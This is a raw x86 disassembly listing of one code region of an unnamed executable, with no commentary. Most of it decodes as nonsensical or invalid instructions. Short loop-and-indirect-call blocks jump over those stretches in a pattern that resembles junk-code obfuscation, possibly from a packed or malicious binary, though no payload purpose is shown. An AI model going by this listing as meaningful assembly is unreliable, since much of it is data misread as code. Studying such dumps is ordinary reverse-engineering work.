  406c51:	hlt    
  406c52:	fwait
  406c53:	push   0x2f1eb910
  406c58:	sub    dh,BYTE PTR es:[esi-0x13]
  406c5c:	pusha  
  406c5d:	nop
  406c5e:	shl    bl,0x8c
  406c61:	inc    esp
  406c62:	daa    
  406c63:	xor    eax,eax
  406c65:	mov    eax,0x6feb7a42
  406c6a:	jbe    0x406cbe
  406c6c:	nop
  406c6d:	jmp    0xe7800aac
  406c72:	sbb    al,0x56
  406c74:	pop    ecx
  406c75:	cs leave 
  406c77:	xchg   esp,eax
  406c78:	loopne 0x406cf4
  406c7a:	adc    DWORD PTR [ebp-0x1],esi
  406c7d:	sysret 
  406c7f:	cmp    esi,esp
  406c81:	jp     0x406c1f
  406c83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c84:	call   0xc765:0xbfcd4fe7
  406c8b:	adc    edx,DWORD PTR [ebx+0x52d9b290]
  406c91:	ja     0x406c76
  406c93:	addr16 inc ebx
  406c95:	addr16 es add al,0xea
  406c99:	rcr    DWORD PTR [ebp-0xf],0xec
  406c9d:	scas   al,BYTE PTR es:[edi]
  406c9e:	xchg   ebp,eax
  406c9f:	jne    0x406ccb
  406ca1:	xchg   ax,ax
  406ca3:	sbb    BYTE PTR [eax-0x76464c5c],dh
  406ca9:	test   al,0xd6
  406cab:	ss push ss
  406cad:	push   cs
  406cae:	(bad)  
  406caf:	jmp    0x2cac:0x60377566
  406cb6:	sbb    BYTE PTR [ecx+0x6e],al
  406cb9:	jns    0x406d1e
  406cbb:	sub    eax,0x16887b00
  406cc0:	inc    esi
  406cc1:	add    edx,esp
  406cc3:	jmp    0xf466d756
  406cc8:	pop    ebx
  406cc9:	jnp    0x406cb5
  406ccb:	retf   
  406ccc:	mov    ecx,0xd1da0b48
  406cd1:	and    edx,ebp
  406cd3:	ja     0x406d1b
  406cd5:	mov    ebx,0x547be393
  406cda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cdb:	push   0x90061f2b
  406ce0:	in     al,0x2
  406ce2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ce3:	data16 add ch,dh
  406ce6:	sub    DWORD PTR [ebx+esi*2],eax
  406ce9:	cwde   
  406cea:	loop   0x406c8e
  406cec:	leave  
  406ced:	cld    
  406cee:	xor    bh,bh
  406cf0:	or     al,0xf3
  406cf2:	sbb    esp,0xffffffd3
  406cf5:	sti    
  406cf6:	push   ebx
  406cf7:	mov    ecx,0xb2adba61
  406cfc:	xchg   ebp,eax
  406cfd:	jg     0x406d4c
  406cff:	add    BYTE PTR [ebx],dl
  406d01:	mov    al,0x17
  406d03:	xor    eax,0xe03d3886
  406d08:	jmp    0x406d89
  406d0a:	mov    ebx,0xf74306c6
  406d0f:	mov    ds:0xb7ac709c,al
  406d14:	xchg   edx,eax
  406d15:	push   ss
  406d16:	adc    DWORD PTR [eax],edi
  406d18:	mov    ebx,0x133c7ab2
  406d1d:	pop    esp
  406d1e:	(bad)  
  406d1f:	in     al,dx
  406d20:	jg     0x406d77
  406d22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d23:	xchg   esp,ebx
  406d25:	or     eax,DWORD PTR [edi-0x3a4f88d8]
  406d2b:	sar    DWORD PTR [eax-0x45],cl
  406d2e:	dec    edx
  406d2f:	dec    esi
  406d30:	pop    eax
  406d31:	mov    esp,0xf6a85c70
  406d36:	xchg   edx,eax
  406d37:	jne    0x406cf4
  406d39:	mov    ecx,0xabc4a310
  406d3e:	and    dh,dl
  406d40:	cwde   
  406d41:	mov    ecx,0x5178ffe3
  406d46:	add    eax,0xc39b9560
  406d4b:	out    0x5c,eax
  406d4d:	jmp    0xb9df:0xb2fd7bb
  406d54:	or     DWORD PTR [esi-0x70b8800e],esp
  406d5a:	imul   BYTE PTR [edx]
  406d5c:	pop    ss
  406d5d:	jge    0x406d91
  406d5f:	cmp    bh,BYTE PTR ds:0x8558498e
  406d65:	dec    edi
  406d66:	or     BYTE PTR [eax],bh
  406d68:	mov    dl,0x40
  406d6a:	inc    edi
  406d6b:	ins    BYTE PTR es:[edi],dx
  406d6c:	repnz cmp eax,0x91c43b30
  406d72:	push   cs
  406d73:	sub    bl,BYTE PTR [ecx]
  406d75:	fucomi st,st(5)
  406d77:	ret    
  406d78:	mov    ebp,0x64a05a81
  406d7d:	fimul  DWORD PTR [ebx-0x218aa72f]
  406d83:	mov    ds:0x80a26e6c,al
  406d88:	xchg   ch,al
  406d8a:	mov    ds:0x6f6082bb,eax
  406d8f:	mov    DWORD PTR [ecx-0x6e],ebp
  406d92:	add    BYTE PTR [ecx+0x3a64e437],cl
  406d98:	imul   esp,esi,0xd103ffc1
  406d9e:	and    DWORD PTR ds:0x4304df,0x0
  406da8:	mov    edi,DWORD PTR ds:0x4304df
  406dae:	inc    edi
  406daf:	mov    DWORD PTR ds:0x4304df,edi
  406db5:	cmp    DWORD PTR ds:0x4304df,0xa
  406dbc:	jne    0x406dcb
  406dc2:	push   DWORD PTR [ebp-0x1c]
  406dc5:	call   DWORD PTR ds:0x42ec23
  406dcb:	cmp    DWORD PTR ds:0x4304df,0x9
  406dd2:	jne    0x406de7
  406dd8:	xor    edi,edi
  406dda:	or     edi,DWORD PTR ds:0x4304df
  406de0:	inc    edi
  406de1:	mov    DWORD PTR ds:0x4304df,edi
  406de7:	cmp    DWORD PTR ds:0x4304df,0x19
  406dee:	jb     0x406da8
  406df4:	xor    DWORD PTR ds:0x42e7c0,edx
  406dfa:	jmp    0x406fab
  406dff:	xchg   BYTE PTR [ebx+0x34],bl
  406e02:	sahf   
  406e03:	icebp  
  406e04:	jno    0x406d9a
  406e06:	arpl   WORD PTR [ecx-0x50477b7b],si
  406e0c:	inc    ebx
  406e0d:	in     al,0xcd
  406e0f:	icebp  
  406e10:	cmp    BYTE PTR [esi+0x7e],bh
  406e13:	mov    bh,BYTE PTR [edi+0x7e]
  406e16:	jle    0x406e03
  406e18:	scas   al,BYTE PTR es:[edi]
  406e19:	adc    BYTE PTR [esi+eiz*1+0x63],dh
  406e1d:	shl    esp,cl
  406e1f:	enter  0x7aab,0xb2
  406e23:	sub    DWORD PTR ds:0xd2aea02f,esp
  406e29:	mov    BYTE PTR [ebp+edx*1+0x53e6288b],cl
  406e30:	stos   BYTE PTR es:[edi],al
  406e31:	in     al,0xd9
  406e33:	or     eax,0xee01320d
  406e38:	pop    ebx
  406e39:	xchg   esp,eax
  406e3a:	shl    DWORD PTR [edx],cl
  406e3c:	rol    DWORD PTR [esi+0x56ecd245],0x3b
  406e43:	test   esp,edx
  406e45:	or     eax,esp
  406e47:	and    ecx,DWORD PTR [edi]
  406e49:	xlat   BYTE PTR ds:[ebx]
  406e4a:	retf   0x73d1
  406e4d:	ror    cl,1
  406e4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e50:	scas   al,BYTE PTR es:[edi]
  406e51:	and    eax,0xce87d1c0
  406e56:	pop    esi
  406e57:	aas    
  406e58:	mov    esi,0xdadb94bf
  406e5d:	adc    ah,bl
  406e5f:	loopne 0x406ea6
  406e61:	in     al,0x41
  406e63:	sub    BYTE PTR [ecx-0x65],ah
  406e66:	aas    
  406e67:	popf   
  406e68:	push   DWORD PTR [ebx+0x773d716e]
  406e6e:	lods   eax,DWORD PTR ds:[esi]
  406e6f:	inc    esi
  406e70:	xchg   ebp,eax
  406e71:	lahf   
  406e72:	mov    dh,0x9c
  406e74:	loopne 0x406ea7
  406e76:	sti    
  406e77:	fnstsw WORD PTR [eax]
  406e79:	fist   DWORD PTR [esp+ebx*1]
  406e7c:	icebp  
  406e7d:	inc    BYTE PTR [edx+0x2c03613b]
  406e83:	iret   
  406e84:	xchg   edx,eax
  406e85:	call   0x9f16e97a
  406e8a:	mov    ch,BYTE PTR [ecx]
  406e8c:	(bad)  
  406e8d:	push   ebx
  406e8e:	sbb    ebp,DWORD PTR [ecx]
  406e90:	sbb    al,0x31
  406e92:	mov    eax,ds:0xde59838f
  406e97:	push   edi
  406e98:	jae    0x406eb1
  406e9a:	fadd   DWORD PTR [ebx-0x66]
  406e9d:	outs   dx,BYTE PTR ds:[esi]
  406e9e:	adc    ch,0x32
  406ea1:	or     DWORD PTR ds:0xa329b34c,ebp
  406ea7:	or     DWORD PTR [ecx-0x5d],eax
  406eaa:	ss retf 
  406eac:	ficom  DWORD PTR [edx-0x127e1584]
  406eb2:	int    0x31
  406eb4:	(bad)  
  406eb6:	lahf   
  406eb7:	fist   WORD PTR [edx]
  406eb9:	test   DWORD PTR [edx-0x1a],esp
  406ebc:	xlat   BYTE PTR ds:[ebx]
  406ebd:	push   edx
  406ebe:	lds    edx,FWORD PTR [ebx]
  406ec0:	daa    
  406ec1:	les    esi,FWORD PTR [ecx+0x47]
  406ec4:	mov    al,ds:0xbaf800bd
  406ec9:	cld    
  406eca:	out    dx,al
  406ecb:	sbb    ecx,DWORD PTR [esi+0x7668fa87]
  406ed1:	rcl    DWORD PTR [edi-0x25],0xf9
  406ed5:	ss out 0xcd,al
  406ed8:	jl     0x406ef4
  406eda:	daa    
  406edb:	add    eax,0xd7c15b4
  406ee0:	push   ebx
  406ee1:	mov    eax,ds:0xab3ec658
  406ee6:	jmp    0x406e9f
  406ee8:	adc    esp,0x7773fbba
  406eee:	mov    eax,ds:0xe8f011c8
  406ef3:	int    0x40
  406ef5:	push   eax
  406ef6:	mov    eax,ds:0xd0968df9
  406efb:	adc    BYTE PTR ds:[edx-0x29],dl
  406eff:	pop    ecx
  406f00:	mov    dh,0xee
  406f02:	das    
  406f03:	fdivr  QWORD PTR [ebx]
  406f05:	lds    eax,FWORD PTR [esi+0x18]
  406f08:	xchg   esi,eax
  406f09:	iret   
  406f0a:	push   ss
  406f0b:	(bad)  
  406f0c:	test   al,0x44
  406f0e:	pop    ebx
  406f0f:	aas    
  406f10:	xor    DWORD PTR [esi],esi
  406f12:	in     eax,dx
  406f13:	mov    esi,0x3f41ae0b
  406f18:	mov    al,0x97
  406f1a:	xor    BYTE PTR [ebp+0x295e4b1b],bh
  406f20:	sahf   
  406f21:	rcr    cl,1
  406f23:	mov    cl,0x6a
  406f25:	jne    0x406ec8
  406f27:	mov    bl,0xa4
  406f29:	xchg   ebx,eax
  406f2a:	stc    
  406f2b:	sar    ch,1
  406f2d:	inc    ecx
  406f2e:	jmp    0xbc23:0x809f95f9
  406f35:	hlt    
  406f36:	and    DWORD PTR [edx],esi
  406f38:	std    
  406f39:	stos   BYTE PTR es:[edi],al
  406f3a:	mov    al,ds:0xc50db15e
  406f3f:	popf   
  406f40:	aas    
  406f41:	sbb    BYTE PTR [esi],cl
  406f43:	mov    esi,edx
  406f45:	and    al,0xf3
  406f47:	movlps QWORD PTR [ebp-0x567dbd2b],xmm1
  406f4e:	sbb    ah,dh
  406f50:	push   es
  406f51:	out    0xf9,eax
  406f53:	test   BYTE PTR [eax+eax*1],bh
  406f56:	mov    DWORD PTR [eax-0xba9f3e],esi
  406f5c:	arpl   WORD PTR [edi],di
  406f5e:	lds    ebx,FWORD PTR [esi-0x6c435374]
  406f64:	inc    eax
  406f65:	xchg   edx,eax
  406f66:	sbb    al,0xff
  406f68:	or     dl,ch
  406f6a:	test   BYTE PTR [ecx-0x1b947de2],bh
  406f70:	test   al,0x92
  406f72:	push   0x1a
  406f74:	jno    0x406fdb
  406f76:	pop    esp
  406f77:	out    dx,eax
  406f78:	jle    0x406fa2
  406f7a:	(bad)  
  406f7b:	test   BYTE PTR [ebx],0x97
  406f7e:	je     0x406fae
  406f80:	jb     0x406f5b
  406f82:	(bad)  
  406f83:	out    0x92,al
  406f85:	jo     0x406f29
  406f87:	or     eax,0xda0b4e17
  406f8c:	je     0x406f0f
  406f8e:	outs   dx,DWORD PTR ds:[esi]
  406f8f:	jmp    0x79191e92
  406f94:	addr16 jb 0x406f73
  406f97:	dec    edx
  406f98:	ja     0x406fe9
  406f9a:	xor    al,0x8
  406f9c:	or     al,BYTE PTR [ebx]
  406f9e:	jbe    0x406fe8
  406fa0:	mov    ecx,0xa557daee
  406fa5:	cmp    al,0xc
  406fa7:	dec    ebx
  406fa8:	jp     0x406f3e
  406faa:	(bad)  
  406fab:	mov    DWORD PTR [ebp-0x8],edx
  406fae:	mov    edx,DWORD PTR [ebp+0x8]
  406fb1:	xor    edi,DWORD PTR ds:0x430465
  406fb7:	xor    edx,eax
  406fb9:	add    edx,ecx
  406fbb:	xor    DWORD PTR ds:0x430445,edi
  406fc1:	jmp    0x407172
  406fc6:	sub    DWORD PTR [ebx],ecx
  406fc8:	fnstsw WORD PTR [esi]
  406fca:	fucomp st(0)
  406fcc:	sub    ecx,ebp
  406fce:	cmp    DWORD PTR ds:0xd9e53d82,edx
  406fd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fd5:	push   edi
  406fd6:	or     eax,0x8a7e7ec6
  406fdb:	jg     0x40705b
  406fdd:	jle    0x406f89
  406fdf:	inc    edi
  406fe0:	imul   ebp,DWORD PTR [edi+ecx*2+0x69],0x26e9134f
  406fe8:	sub    al,0x63
  406fea:	mov    edi,0x84fc726e
  406fef:	xlat   BYTE PTR ds:[ebx]
  406ff0:	hlt    
  406ff1:	out    dx,al
  406ff2:	xor    DWORD PTR [esi-0x4b1978fa],eax
  406ff8:	dec    DWORD PTR [eax-0x6c]
  406ffb:	hlt    
  406ffc:	stc    
  406ffd:	push   esi
  406ffe:	ins    BYTE PTR es:[edi],dx
  406fff:	loop   0x406fcf
  407001:	les    ebx,FWORD PTR [edx+0x65c3c946]
  407007:	jmp    0xba25:0x9ee0d61f
  40700e:	cmp    ah,ch
  407010:	(bad)  
  407011:	ja     0x407060
  407013:	aad    0xb5
  407015:	jmp    0x5c32933d
  40701a:	(bad)  
  40701b:	cmp    DWORD PTR [ebx-0x7ce32f99],esp
  407021:	aas    
  407022:	pop    edx
  407023:	or     esp,edx
  407025:	jmp    0x407082
  407027:	int    0x5
  407029:	mov    ss,WORD PTR [edx]
  40702b:	in     eax,dx
  40702c:	pop    ecx
  40702d:	jo     0x40706a
  40702f:	ins    DWORD PTR es:[edi],dx
  407030:	sub    al,0x44
  407032:	pop    ebp
  407033:	inc    ebx
  407034:	sti    
  407035:	dec    ebx
  407036:	ins    DWORD PTR es:[edi],dx
  407037:	mov    esi,DWORD PTR [esi-0x5b]
  40703a:	mov    ebx,0x5b9237c5
  40703f:	sbb    al,BYTE PTR [ebp+0x2f1c4656]
  407045:	test   al,0xf
  407047:	and    BYTE PTR [esi+0x60],al
  40704a:	or     ecx,DWORD PTR [esi-0x30]
  40704d:	push   cs
  40704e:	lea    esp,[ecx+0x46]
  407051:	inc    esi
  407052:	dec    esi
  407053:	push   0x5c
  407055:	cmp    al,0xd5
  407057:	fisubr WORD PTR [ebx+edi*2]
  40705a:	push   es
  40705b:	jecxz  0x4070b0
  40705d:	ret    
  40705e:	cmp    eax,0xf73b7ee8
  407063:	jns    0x40702a
  407065:	ret    0x69cc
  407068:	imul   eax,eax,0xffffff89
  40706b:	addr16 out 0xdc,eax
  40706e:	dec    ecx
  40706f:	in     eax,0x56
  407071:	arpl   bp,bp
  407073:	imul   esp,DWORD PTR [ebx],0x44869ede
  407079:	ss and eax,0xfd66a028
  40707f:	dec    ebx
  407080:	jbe    0x4070e7
  407082:	test   al,0xa2
  407084:	mov    ecx,0x8320d396
  407089:	mov    eax,0xd1283ec6
  40708e:	push   ds
  40708f:	aas    
  407090:	call   0xc94b2788
  407095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407096:	fst    QWORD PTR [edi*8-0x5dcad850]
  40709d:	cs loope 0x4070c3
  4070a0:	(bad)  
  4070a1:	push   ebx
  4070a2:	jno    0x4070b2
  4070a4:	loope  0x407031
  4070a6:	mov    bh,0xd5
  4070a8:	ret    
  4070a9:	jb     0x407106
  4070ab:	mov    esi,fs
  4070ad:	jnp    0x4070c3
  4070af:	test   eax,0x6f87ca55
  4070b4:	sbb    ah,ah
  4070b6:	cmp    DWORD PTR [ebx+0x8],esp
  4070b9:	ins    DWORD PTR es:[edi],dx
  4070ba:	or     BYTE PTR [eax+eax*8],0xd2
  4070be:	xor    dh,BYTE PTR [edx+0x5]
  4070c1:	loopne 0x4070f7
  4070c3:	push   si
  4070c5:	dec    edi
  4070c6:	inc    ebp
  4070c7:	stc    
  4070c8:	sub    ebx,DWORD PTR [esi+0x16]
  4070cb:	retf   
  4070cc:	cmp    eax,0x67f08485
  4070d1:	push   eax
  4070d2:	out    dx,eax
  4070d3:	mov    ?,WORD PTR [edi]
  4070d5:	inc    ebx
  4070d6:	sbb    BYTE PTR [eax+0x59],cl
  4070d9:	jne    0x407084
  4070db:	aaa    
  4070dc:	xchg   BYTE PTR [edx+0x511be747],ah
  4070e2:	fadd   QWORD PTR [eax+eax*8+0x7]
  4070e6:	mov    edi,0xcc63ab43
  4070eb:	mov    dl,0x55
  4070ed:	push   esp
  4070ee:	push   edx
  4070ef:	fsubr  QWORD PTR [eax]
  4070f1:	dec    ecx
  4070f2:	into   
  4070f3:	cwde   
  4070f4:	in     al,0x52
  4070f6:	push   ebx
  4070f7:	repz mov dh,0x9f
  4070fa:	(bad)  
  4070fb:	inc    esp
  4070fc:	fmul   DWORD PTR [esi+0x13111505]
  407102:	jnp    0x407162
  407104:	clc    
  407105:	cdq    
  407106:	pop    esi
  407107:	(bad)  [eax-0x5f3c1ade]
  40710d:	test   DWORD PTR [esp+eax*2+0x24df1114],ecx
  407114:	dec    edi
  407115:	xor    eax,0xe5205cf3
  40711a:	add    al,0x1b
  40711c:	pusha  
  40711d:	jno    0x4070db
  40711f:	and    DWORD PTR [edx],edx
  407121:	popa   
  407122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407123:	arpl   WORD PTR [edx],cx
  407125:	repz sub eax,esi
  407128:	adc    cl,BYTE PTR [ecx]
  40712a:	pop    es
  40712b:	xor    DWORD PTR [ecx-0x1c],eax
  40712e:	test   DWORD PTR [ebp+0x3b],esi
  407131:	ficom  WORD PTR [ecx]
  407133:	and    BYTE PTR [eax+0x20322f5a],0x9a
  40713a:	loope  0x40715c
  40713c:	popa   
  40713d:	pop    ds
  40713e:	or     al,0x3
  407140:	push   0xe89cb5da
  407145:	push   edi
  407146:	ins    DWORD PTR es:[edi],dx
  407147:	inc    edx
  407148:	or     BYTE PTR [eax+0x5a],ah
  40714b:	and    al,0x41
  40714d:	int3   
  40714e:	pop    ss
  40714f:	(bad)  
  407150:	adc    al,BYTE PTR [esi]
  407152:	lahf   
  407153:	add    edi,DWORD PTR [ebx+0x242287a4]
  407159:	xlat   BYTE PTR ds:[ebx]
  40715a:	retf   
  40715b:	ficom  WORD PTR [edx-0x7c]
  40715e:	or     eax,0x247b1794
  407163:	enter  0xdd48,0x3d
  407167:	xchg   ecx,eax
  407168:	xchg   esp,edi
  40716a:	mov    gs,WORD PTR ds:0x49415651
  407170:	jo     0x4071c1
  407172:	mov    DWORD PTR [ebp+0xc],edx
  407175:	and    DWORD PTR ds:0x42e7c0,0x0
  40717f:	jmp    0x407191
  407184:	mov    edi,DWORD PTR ds:0x42e7c0
  40718a:	inc    edi
  40718b:	mov    DWORD PTR ds:0x42e7c0,edi
  407191:	cmp    DWORD PTR ds:0x42e7c0,0x1a
  407198:	jae    0x4071c1
  40719e:	cmp    DWORD PTR ds:0x42e7c0,0x28
  4071a5:	jne    0x4071b6
  4071ab:	push   0x716b
  4071b0:	call   DWORD PTR ds:0x42eaab
  4071b6:	jmp    0x407184
  4071bb:	and    DWORD PTR ds:0x430469,edi
  4071c1:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  4071c8:	adc    edi,DWORD PTR ds:0x43044d
  4071ce:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4071d5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4071dc:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4071e3:	and    DWORD PTR ds:0x430461,0x0
  4071ed:	mov    edi,DWORD PTR ds:0x430461
  4071f3:	inc    edi
  4071f4:	mov    DWORD PTR ds:0x430461,edi
  4071fa:	cmp    DWORD PTR ds:0x430461,0x6
  407201:	jne    0x407247
  407207:	push   0x42e929
  40720c:	push   DWORD PTR [ebp-0x14]
  40720f:	push   0x2c1e
  407214:	push   0x5ddb
  407219:	push   DWORD PTR [ebp-0x20]
  40721c:	push   0x67ee
  407221:	push   DWORD PTR [ebp-0x18]
  407224:	push   DWORD PTR [ebp-0x24]
  407227:	push   DWORD PTR [ebp-0x14]
  40722a:	push   0x21a8
  40722f:	push   0x81f6
  407234:	push   0x1b91
  407239:	push   0x8bde
  40723e:	push   DWORD PTR [ebp-0x28]
  407241:	call   DWORD PTR ds:0x42eaaf
  407247:	cmp    DWORD PTR ds:0x430461,0x5
  40724e:	jne    0x407261
  407254:	mov    edi,DWORD PTR ds:0x430461
  40725a:	inc    edi
  40725b:	mov    DWORD PTR ds:0x430461,edi
  407261:	cmp    DWORD PTR ds:0x430461,0x12
  407268:	jb     0x4071ed
  40726e:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  407275:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40727c:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  407283:	mov    edx,DWORD PTR [ebp+0x8]
  407286:	xor    edi,edi
  407288:	add    edi,DWORD PTR ds:0x42e7bc
  40728e:	or     DWORD PTR ds:0x430465,edi
  407294:	jmp    0x407445
  407299:	mov    edx,0xad140ee9
  40729e:	icebp  
  40729f:	inc    eax
  4072a0:	jno    0x4072e6
  4072a2:	mov    eax,ds:0x1cc13f15
  4072a7:	inc    ecx
  4072a8:	cmp    al,0x99
  4072aa:	(bad)  
  4072ab:	jle    0x40732b
  4072ad:	mov    bh,BYTE PTR [edi+0x7e]
  4072b0:	jle    0x4072e3
  4072b2:	xchg   ebp,eax
  4072b3:	lahf   
  4072b4:	pushf  
  4072b5:	fisub  WORD PTR [edx+0x4b0bc4df]
  4072bb:	xchg   esp,edi
  4072bd:	jmp    0x407283
  4072bf:	pop    es
  4072c0:	fs inc esp
  4072c2:	jg     0x407300
  4072c4:	sub    DWORD PTR [esi+0xf],eax
  4072c7:	mov    ds:0x99db2334,eax
  4072cc:	or     ah,BYTE PTR [esp+eax*4-0x57]
  4072d0:	into   
  4072d1:	hlt    
  4072d2:	outs   dx,BYTE PTR ds:[esi]
  4072d3:	scas   eax,DWORD PTR es:[edi]
  4072d4:	lods   al,BYTE PTR ds:[esi]
  4072d5:	mov    esi,0x26347b9c
  4072da:	repnz pop ss
  4072dc:	rcr    BYTE PTR [ebx],0x97
  4072df:	aam    0xc
  4072e1:	loopne 0x40735d
  4072e3:	or     dl,bh
  4072e5:	jle    0x4072c8
  4072e7:	outs   dx,DWORD PTR ds:[esi]
  4072e8:	pop    DWORD PTR [edi]
  4072ea:	jmp    0xf7ec:0x8ebc66b8
  4072f1:	pusha  
  4072f2:	pushf  
  4072f3:	retf   
  4072f4:	mov    ?,WORD PTR [eax]
  4072f6:	xor    BYTE PTR [edx+0x1c53ed84],0xf2
  4072fd:	mov    cl,0xa6
  4072ff:	push   es
  407300:	xchg   edi,eax
  407301:	inc    esi
  407302:	fiadd  WORD PTR [eax+eiz*4]
  407305:	sbb    eax,0x25ff33b4
  40730a:	and    ah,BYTE PTR [esp+edx*1+0x68fa90fb]
  407311:	lods   eax,DWORD PTR ds:[esi]
  407312:	jne    0x407374
  407314:	push   es
  407315:	sub    DWORD PTR [edi+0x2569441a],eax
  40731b:	aad    0x19
  40731d:	stos   BYTE PTR es:[edi],al
  40731e:	shl    DWORD PTR [edx+0x25645168],1
  407324:	dec    edx
  407325:	cdq    
  407326:	or     dl,cl
  407328:	std    
  407329:	mov    edx,0xd786ced2
  40732e:	lds    edi,FWORD PTR [edi+ecx*1]
  407331:	inc    ebp
  407332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407333:	shl    BYTE PTR [ebp+0x4e71f017],1
  407339:	daa    
  40733a:	outs   dx,BYTE PTR ds:[esi]
  40733b:	in     al,0xa8
  40733d:	js     0x4072cc
  40733f:	fwait
  407340:	ret    0xffb1
  407343:	mov    ds:0xd8bcbc63,al
  407348:	int    0xb7
  40734a:	jge    0x40739a
  40734c:	frstor [ebx]
  40734e:	mul    BYTE PTR [edi+0x62c64840]
  407354:	hlt    
  407355:	or     BYTE PTR [ebx-0x6b],0x3e
  407359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40735a:	lods   eax,DWORD PTR ds:[esi]
  40735c:	push   0xffffffe8
  40735e:	xchg   esp,eax
  40735f:	and    DWORD PTR [ebx],esp
  407361:	out    0x41,al
  407363:	test   eax,0xc6378631
  407368:	add    eax,0x64cea134
  40736d:	push   ebx
  40736e:	inc    eax
  40736f:	jno    0x407334
  407371:	cld    
  407372:	xor    dl,al
  407374:	push   edi
  407375:	or     edi,DWORD PTR [edi]
  407377:	dec    ebx
  407378:	adc    eax,DWORD PTR [edx+0x788be2e8]
  40737e:	nop
  40737f:	xchg   ecx,eax
  407380:	mov    al,BYTE PTR [edi+edi*4+0x736f7384]
  407387:	or     DWORD PTR [eax+eax*8+0x40811d96],ebx
  40738e:	dec    edi
  40738f:	shl    DWORD PTR [eax+0x1f],cl
  407392:	in     eax,0x8b
  407394:	mov    esi,0xe7ea768c
  407399:	mov    ebx,DWORD PTR [edi]
  40739b:	push   ebx
  40739c:	mov    esp,gs
  40739e:	adc    DWORD PTR ds:0x56e4743f,esp
  4073a4:	lea    eax,[edx-0x4ab8d45]
  4073aa:	sbb    dl,al
  4073ac:	adc    BYTE PTR [ebx-0x35],ah
  4073af:	xchg   DWORD PTR [ebx+ecx*2],ebp
  4073b2:	mov    cl,0xef
  4073b4:	and    esi,DWORD PTR [ebx+0x154baed0]
  4073ba:	inc    esi
  4073bb:	test   al,0x35
  4073bd:	mov    ch,BYTE PTR [edx+0x46]
  4073c0:	mov    dl,0xfd
  4073c2:	adc    DWORD PTR [ebx+0x11],edi
  4073c5:	and    al,0x12
  4073c7:	scas   al,BYTE PTR es:[edi]
  4073c8:	ss retf 0x2899
  4073cc:	xor    DWORD PTR [edi+0x4ef3aa91],esp
  4073d2:	std    
  4073d3:	push   ss
  4073d4:	cmp    DWORD PTR ds:0x616af4f9,esp
  4073da:	sub    ebx,ecx
  4073dc:	push   ebp
  4073dd:	arpl   WORD PTR [esi+0xb],cx
  4073e0:	test   BYTE PTR [eax],ch
  4073e2:	mov    ds:0xbd00c1aa,al
  4073e7:	ficom  DWORD PTR [ecx+0xc]
  4073ea:	enter  0x4ddb,0x7b
  4073ee:	loopne 0x40738f
  4073f0:	int    0xb1
  4073f2:	fiadd  WORD PTR [ecx-0x38]
  4073f5:	in     eax,0xbd
  4073f7:	inc    ecx
  4073f8:	aaa    
  4073f9:	adc    ecx,esi
  4073fb:	pop    es
  4073fc:	add    esi,edi
  4073fe:	arpl   WORD PTR [ebx-0x149f23a3],cx
  407404:	xchg   esp,eax
  407405:	mov    dl,0xcd
  407407:	or     BYTE PTR [eax],bl
  407409:	mov    fs,WORD PTR [ecx+ecx*8-0x14]
  40740d:	adc    bh,0xe6
  407410:	jae    0x4073e9
  407412:	int    0x2d
  407414:	scas   eax,DWORD PTR es:[edi]
  407415:	test   al,0x72
  407417:	cmc    
  407418:	add    BYTE PTR [edx+esi*2],dl
  40741b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40741c:	cmp    al,0xd6
  40741e:	sub    DWORD PTR [esi+0x30],0x35
  407422:	mov    ebx,0x1bd3e676
  407427:	inc    edi
  407428:	(bad)
  40742b:	popf   
  40742c:	cmp    eax,0xe31179ed
  407431:	xor    esi,edx
  407433:	sub    dh,bl
  407435:	mov    ah,0xaf
  407437:	pop    ebx
  407438:	xchg   ebx,eax
  407439:	adc    dl,BYTE PTR [ebx+0x7b]
  40743c:	(bad)  
  40743e:	arpl   si,dx
  407440:	aad    0x33
  407442:	mov    fs:0x8bd0331a,al
  407448:	jge    0x40743a
  40744a:	or     DWORD PTR ds:0x4304d7,0x71a5
  407454:	add    edx,ecx
  407456:	mov    DWORD PTR ds:0x430449,0x5a49
  407460:	cmp    edi,edx
  407462:	mov    DWORD PTR ds:0x4304cf,0x6748
  40746c:	jmp    0x40761d
  407471:	not    DWORD PTR [ebp+edx*8-0xca68ae7]
  407478:	push   eax
  407479:	jb     0x4074d4
  40747b:	out    dx,eax
  40747c:	or     bl,cl
  40747e:	xor    DWORD PTR [ecx+0x7ec53522],0x7e
  407485:	mov    bh,BYTE PTR [edi+0x7e]
  407488:	jle    0x40740b
  40748a:	test   eax,0xc01aaba0
  40748f:	add    al,0x37
  407491:	jl     0x4074bb
  407493:	pop    ecx
  407494:	dec    esp
  407495:	jmp    0x6e6b5903
  40749a:	or     BYTE PTR [esi+0x57],ch
  40749d:	inc    edx
  40749e:	or     ch,BYTE PTR [edi+ebp*1-0x2203e857]
  4074a5:	cmp    DWORD PTR [esi-0x4f],ebp
  4074a8:	jg     0x4074b8
  4074aa:	add    BYTE PTR [esi-0x568bf738],ah
  4074b0:	mov    dl,0xe1
  4074b2:	mov    DWORD PTR [edx],ecx
  4074b4:	call   0x9805:0xa613ab7e
  4074bb:	pop    esi
  4074bc:	sub    al,0xcb
  4074be:	dec    edx
  4074bf:	dec    eax
  4074c0:	out    dx,eax
  4074c1:	pmulhw mm3,QWORD PTR [edi]
  4074c4:	imul   ebx,DWORD PTR [edi+0x30b72bfc],0xffffff94
  4074cb:	add    BYTE PTR ds:0xb4be237a,al
  4074d1:	addr16 ja 0x407525
  4074d4:	outs   dx,DWORD PTR ds:[esi]
  4074d5:	mov    esi,0x15d702bd
  4074da:	pop    edi
